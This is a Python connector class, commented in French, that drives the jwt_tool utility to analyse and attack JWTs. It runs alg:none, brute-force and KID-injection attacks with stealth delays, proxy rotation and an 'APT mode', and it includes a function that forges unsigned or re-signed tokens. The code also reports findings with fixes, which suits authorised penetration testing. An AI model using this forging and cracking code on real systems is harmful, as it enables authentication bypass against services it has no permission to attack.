#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Connecteur pour jwt_tool - Outil d'analyse et d'attaque sur JWT
Version avec support furtif, APT et détection avancée
"""

import re
import json
import tempfile
import os
from typing import Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime

from src.connectors.base_connector import BaseConnector


class JWTToolConnector(BaseConnector):
    """Connecteur avancé pour jwt_tool avec support furtif"""
    
    def __init__(self, tool_path: Optional[str] = None):
        """
        Initialise le connecteur jwt_tool
        
        Args:
            tool_path: Chemin personnalisé vers l'exécutable jwt_tool
        """
        super().__init__(tool_path)
        self.default_wordlist = "/usr/share/wordlists/passwords.txt"
        self.attack_types = ['none', 'brute', 'kid', 'analyse', 'all']
    
    def _find_tool(self) -> Optional[str]:
        """Trouve l'exécutable jwt_tool"""
        import shutil
        
        # jwt_tool est souvent un script Python
        paths = [
            "jwt_tool",
            "jwt-tool",
            "/usr/local/bin/jwt_tool",
            "/usr/bin/jwt_tool",
            "/opt/jwt_tool/jwt_tool.py"
        ]
        
        for path in paths:
            if path and shutil.which(path):
                return path
        
        # Vérifier si c'est un script Python
        python_script = shutil.which("python3")
        if python_script:
            # Chercher jwt_tool.py
            import subprocess
            try:
                result = subprocess.run(
                    ["find", "/usr", "-name", "jwt_tool.py"], 
                    capture_output=True, text=True, timeout=5
                )
                if result.stdout.strip():
                    return f"python3 {result.stdout.strip()}"
            except:
                pass
        
        return None
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Analyse un token JWT
        
        Args:
            target: Token JWT à analyser
            **kwargs:
                - attack: Type d'attaque (none, brute, kid, analyse, all)
                - wordlist: Wordlist pour brute force
                - algo: Algorithme à tester
                - headers: Headers à ajouter
                - cookies: Cookies à ajouter
                - proxy: Proxy à utiliser
                - output: Fichier de sortie
        """
        if not self.available:
            return {
                "success": False,
                "error": "jwt_tool non installé",
                "findings": [],
                "apt_mode": self.apt_mode
            }
        
        # Appliquer le délai furtif
        self._apply_stealth_delay()
        
        cmd = [self.tool_path]
        
        # Mode attaque
        attack_type = kwargs.get('attack', 'analyse')
        
        if attack_type == 'none':
            # Attaque alg: none
            cmd.extend(['-X', 'a'])
        elif attack_type == 'brute':
            # Brute force secret
            cmd.extend(['-X', 'b'])
            wordlist = kwargs.get('wordlist', self.default_wordlist)
            if Path(wordlist).exists():
                cmd.extend(['-d', wordlist])
            else:
                # Wordlist par défaut avec mots courants
                common_secrets = ['secret', 'password', 'admin', 'key', 'jwt', 'token']
                temp_wordlist = self._create_temp_wordlist(common_secrets)
                cmd.extend(['-d', temp_wordlist])
        elif attack_type == 'kid':
            # Attaque KID (Key ID)
            cmd.extend(['-X', 'k'])
        elif attack_type == 'all':
            # Toutes les attaques
            cmd.extend(['-X', 'all'])
        else:
            # Mode analyse simple
            cmd.append('-t')
        
        # Token
        cmd.append(target)
        
        # Options de furtivité
        if kwargs.get('quiet') or self.apt_mode:
            cmd.append('-q')
        
        if kwargs.get('verbose'):
            cmd.append('-v')
        
        # Headers personnalisés
        headers = kwargs.get('headers', {})
        for key, value in headers.items():
            cmd.extend(['-H', f"{key}: {value}"])
        
        # Cookies
        cookies = kwargs.get('cookies')
        if cookies:
            if isinstance(cookies, dict):
                cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
            else:
                cookie_str = cookies
            cmd.extend(['-b', cookie_str])
        
        # Proxy
        proxy = kwargs.get('proxy')
        if proxy:
            cmd.extend(['-p', proxy])
        elif self.proxy_rotation:
            proxy = self._get_next_proxy()
            if proxy:
                cmd.extend(['-p', proxy])
        
        # Fichier de sortie
        output_file = kwargs.get('output')
        if output_file:
            cmd.extend(['-o', output_file])
        
        # Timeout
        timeout = kwargs.get('timeout', 60)
        
        # Exécution
        result = self.execute_command(cmd, timeout=timeout)
        
        # Nettoyer les fichiers temporaires
        self._cleanup_temp_files()
        
        if result["success"]:
            findings = self.parse_output(result["stdout"])
            return {
                "success": True,
                "token": self._mask_token(target),
                "findings": findings,
                "has_vulnerabilities": any(f.get("vulnerable", False) for f in findings),
                "raw_output": result["stdout"],
                "execution_time": result.get("execution_time", 0),
                "attack_type": attack_type,
                "apt_mode": self.apt_mode
            }
        else:
            return {
                "success": False,
                "error": result.get("error", "Erreur lors de l'analyse"),
                "stderr": result.get("stderr", ""),
                "findings": [],
                "apt_mode": self.apt_mode
            }
    
    def _create_temp_wordlist(self, words: List[str]) -> str:
        """
        Crée un fichier wordlist temporaire
        
        Args:
            words: Liste des mots
            
        Returns:
            Chemin du fichier temporaire
        """
        temp_file = self.create_temp_output_file("_jwt_wordlist.txt")
        with open(temp_file, 'w') as f:
            for word in words:
                f.write(word + '\n')
        self._temp_files.append(temp_file)
        return temp_file
    
    def _cleanup_temp_files(self):
        """Nettoie les fichiers temporaires créés"""
        for file in getattr(self, '_temp_files', []):
            self.cleanup_temp_file(file)
        self._temp_files = []
    
    def _mask_token(self, token: str) -> str:
        """
        Masque un token JWT pour l'affichage
        
        Args:
            token: Token JWT
            
        Returns:
            Token masqué
        """
        if len(token) <= 30:
            return token
        return token[:15] + '...' + token[-10:]
    
    def parse_output(self, output: str) -> List[Dict[str, Any]]:
        """
        Parse la sortie de jwt_tool avec analyse avancée
        
        Args:
            output: Sortie brute de jwt_tool
            
        Returns:
            Liste des résultats d'analyse
        """
        findings = []
        
        # Détection des vulnérabilités
        vulnerabilities = {
            "alg_none": {
                "patterns": ["alg: NONE", "Algorithm set to 'none'", "Algorithm: none"],
                "severity": "critical",
                "description": "Le token accepte l'algorithme 'none'",
                "recommendation": "Ne pas accepter l'algorithme 'none'"
            },
            "weak_algorithm": {
                "patterns": ["HS256", "HS384", "HS512", "symmetric algorithm"],
                "severity": "high",
                "description": "Algorithme symétrique faible utilisé",
                "recommendation": "Utiliser un algorithme asymétrique (RS256, ES256)"
            },
            "no_expiration": {
                "patterns": ["No expiration claim", "exp claim missing"],
                "severity": "medium",
                "description": "Token sans date d'expiration",
                "recommendation": "Ajouter une date d'expiration (exp)"
            },
            "weak_secret": {
                "patterns": ["Secret is:", "Weak secret", "Common password"],
                "severity": "critical",
                "description": "Secret faible détecté",
                "recommendation": "Utiliser un secret fort et aléatoire"
            },
            "kid_injection": {
                "patterns": ["KID Injection", "Key ID manipulation", "Path traversal"],
                "severity": "critical",
                "description": "Vulnérabilité d'injection KID",
                "recommendation": "Valider et échapper le paramètre kid"
            }
        }
        
        for vuln_name, vuln_info in vulnerabilities.items():
            for pattern in vuln_info["patterns"]:
                if pattern in output:
                    findings.append({
                        "type": vuln_name,
                        "vulnerable": True,
                        "severity": vuln_info["severity"],
                        "description": vuln_info["description"],
                        "recommendation": vuln_info["recommendation"]
                    })
                    break
        
        # Extraction du header
        header_pattern = r'Header:\s*(\{[^}]+\})'
        header_match = re.search(header_pattern, output, re.DOTALL)
        if header_match:
            try:
                header_content = json.loads(header_match.group(1))
                findings.append({
                    "type": "header",
                    "content": header_content,
                    "algorithm": header_content.get('alg', 'unknown'),
                    "vulnerable": header_content.get('alg', '').lower() == 'none'
                })
            except:
                pass
        
        # Extraction du payload
        payload_pattern = r'Payload:\s*(\{[^}]+\})'
        payload_match = re.search(payload_pattern, output, re.DOTALL)
        if payload_match:
            try:
                payload_content = json.loads(payload_match.group(1))
                findings.append({
                    "type": "payload",
                    "content": payload_content,
                    "claims": list(payload_content.keys()),
                    "has_exp": 'exp' in payload_content,
                    "has_iat": 'iat' in payload_content,
                    "expiration": self._parse_expiration(payload_content.get('exp'))
                })
            except:
                pass
        
        # Secret trouvé
        secret_pattern = r'Secret is:\s*([^\n]+)'
        secret_match = re.search(secret_pattern, output)
        if secret_match:
            findings.append({
                "type": "secret_found",
                "secret": secret_match.group(1).strip(),
                "vulnerable": True,
                "severity": "critical",
                "recommendation": "Changer immédiatement le secret"
            })
        
        # Timing attack
        if "Timing attack" in output:
            findings.append({
                "type": "timing_attack",
                "vulnerable": True,
                "severity": "medium",
                "description": "Vulnérabilité à l'attaque timing",
                "recommendation": "Utiliser une comparaison constante"
            })
        
        return findings
    
    def _parse_expiration(self, exp_value: Optional[int]) -> Optional[str]:
        """
        Parse la date d'expiration
        
        Args:
            exp_value: Timestamp d'expiration
            
        Returns:
            Date d'expiration formatée
        """
        if not exp_value:
            return None
        
        try:
            from datetime import datetime
            exp_date = datetime.fromtimestamp(exp_value)
            return exp_date.isoformat()
        except:
            return str(exp_value)
    
    def decode_token(self, token: str, **kwargs) -> Dict[str, Any]:
        """
        Décode un token JWT sans l'attaquer
        
        Args:
            token: Token JWT
            **kwargs: Options supplémentaires
            
        Returns:
            Résultat du décodage
        """
        return self.scan(token, attack_type='analyse', **kwargs)
    
    def crack_secret(self, token: str, wordlist: str = None, **kwargs) -> Dict[str, Any]:
        """
        Tente de casser le secret du JWT
        
        Args:
            token: Token JWT
            wordlist: Wordlist personnalisée
            **kwargs: Options supplémentaires
            
        Returns:
            Résultat de l'attaque
        """
        return self.scan(token, attack_type='brute', wordlist=wordlist, **kwargs)
    
    def test_none_algorithm(self, token: str, **kwargs) -> Dict[str, Any]:
        """
        Teste la vulnérabilité alg: none
        
        Args:
            token: Token JWT
            **kwargs: Options supplémentaires
            
        Returns:
            Résultat du test
        """
        return self.scan(token, attack_type='none', **kwargs)
    
    def test_kid_injection(self, token: str, **kwargs) -> Dict[str, Any]:
        """
        Teste la vulnérabilité KID injection
        
        Args:
            token: Token JWT
            **kwargs: Options supplémentaires
            
        Returns:
            Résultat du test
        """
        return self.scan(token, attack_type='kid', **kwargs)
    
    def full_attack(self, token: str, **kwargs) -> Dict[str, Any]:
        """
        Exécute toutes les attaques JWT disponibles
        
        Args:
            token: Token JWT
            **kwargs: Options supplémentaires
            
        Returns:
            Résultats complets
        """
        return self.scan(token, attack_type='all', **kwargs)
    
    def forge_token(self, token: str, modifications: Dict[str, Any], 
                    secret: str = None, algorithm: str = None) -> Optional[str]:
        """
        Forge un nouveau token JWT (nécessite jwt_tool ou pyjwt)
        
        Args:
            token: Token original
            modifications: Modifications à appliquer
            secret: Secret pour signer
            algorithm: Algorithme à utiliser
            
        Returns:
            Token forgé ou None
        """
        try:
            import jwt
            import base64
            
            # Décoder le token
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.b64decode(parts[1] + '==').decode())
            
            # Appliquer les modifications
            for key, value in modifications.items():
                payload[key] = value
            
            # Changer l'algorithme si spécifié
            if algorithm:
                header['alg'] = algorithm
            
            # Signer avec le secret ou garder la signature originale
            if secret:
                if algorithm == 'HS256' or not algorithm:
                    new_token = jwt.encode(payload, secret, algorithm='HS256')
                else:
                    new_token = jwt.encode(payload, secret, algorithm=algorithm)
                return new_token
            elif algorithm == 'none':
                # Token non signé
                header_encoded = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                return f"{header_encoded}.{payload_encoded}."
            else:
                # Garder la signature originale (ne fonctionne que si le payload n'a pas changé)
                header_encoded = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                return f"{header_encoded}.{payload_encoded}.{parts[2]}"
                
        except ImportError:
            # Si pyjwt n'est pas installé
            return None
        except Exception:
            return None
    
    def get_version_info(self) -> Dict[str, Any]:
        """
        Récupère les informations de version de jwt_tool
        
        Returns:
            Dictionnaire avec les informations de version
        """
        if not self.available:
            return {"available": False}
        
        result = self.execute_command([self.tool_path, "--version"], stealth=False)
        
        if result["success"]:
            version_line = result["stdout"].split('\n')[0] if result["stdout"] else ""
            return {
                "available": True,
                "version": version_line,
                "tool": "jwt_tool",
                "path": self.tool_path
            }
        
        return {"available": False, "error": result.get("error")}